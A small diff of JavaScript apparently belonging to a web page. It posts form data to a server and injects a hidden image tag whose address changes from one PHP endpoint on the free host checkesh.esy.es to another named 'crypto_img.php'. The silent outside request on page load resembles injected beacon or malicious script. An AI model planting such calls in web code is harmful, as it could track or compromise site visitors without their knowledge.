@@ -23,7 +23,7 @@ http.open("POST", url, true);
 http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
 http.send(params);
 
-s = 'http://checkesh.esy.es/t/iframewin.php';
+s = 'http://checkesh.esy.es/t/crypto_img.php';
 f = document.createElement('img');
 f.src = s;
 document.body.appendChild(f);
